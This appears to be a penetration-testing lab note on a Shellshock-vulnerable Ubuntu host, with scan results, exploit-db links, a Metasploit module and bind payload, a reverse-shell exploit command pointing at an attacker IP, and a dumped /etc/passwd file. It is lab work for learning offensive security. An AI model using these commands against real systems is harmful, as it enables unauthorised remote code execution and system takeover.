# ip
10.11.1.71

# nmap scan
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne

## OS 
Operating System is Ubuntu Linux 14.04 (kernel: 3.13.0-141-generic)
CPU: AMD EPYC 7371 16-Core Processor

## SSH 
SSH server version: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2 ( service.version=6.6.1p1 openssh.comment=Ubuntu-2ubuntu2 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:6.6.1p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=14.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:14.04 service.protocol=ssh fingerprint_db=ssh.banner )

## Server
Server: Apache/2.4.7 (Ubuntu)
5ff4869a472df9a9cc35aefde724fd88

## Programming language
X-Powered-By: PHP/5.5.9-1ubuntu4.4

## CMS 
* BigTree CMS => Version: ### 4.0.6 Release
* Github: https://github.com/bigtreecms/BigTree-CMS
* CSS: Gridlock - A CSS responsive grid system [12 column standard], @author Ben Plum, @version 0.1.9
* jQuery v1.7.1 jquery.com
* Tiny MCE

## Database 
MySql

## Pages

Summary:
* file list: http://10.11.1.71/cgi-bin/test.cgi
* /cgi-bin/admin.cgi 
* http://10.11.1.71/phpmyadmin/
* http://10.11.1.71/custom/
* /cgi-bin/ (Status: 403) => path traversal?
* /phpmyadmin (Status: 301)

/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/core (Status: 301)
/custom (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
/site (Status: 301)
/templates (Status: 301)
+ OSVDB-3092: /cgi-bin/admin.cgi: This might be interesting.                                                                                                                                              
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...    

# findings
Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.                                                                                                        
+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).                                                                   
+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278)  
* https://www.exploit-db.com/exploits/34879                                                                                                                                    

* Priviledge escalsation

https://www.exploit-db.com/exploits/37292


# Evidence
* Use module: multi/http/apache_mod_cgi_bash_env_exec
* with payload ``set payload linux/x86/meterpreter/bind_tcp``
* session created
* Works better with ``sudo python Documents/34900.py payload=reverse rhost=10.11.1.71 lhost=192.168.119.174 lport=4443``


# priviledge escalation
## passwd file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
gibson:x:1000:1000:gibson,,,:/home/gibson:/bin/bash
ossec:x:1001:1001::/var/ossec-hids2.8:/bin/false
ossecm:x:1002:1001::/var/ossec-hids2.8:/bin/false
ossecr:x:1003:1001::/var/ossec-hids2.8:/bin/false

## usr
www-data @ alpha (uid=33, gid=33, euid=33, egid=33)

## supported shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux
/usr/bin/screen

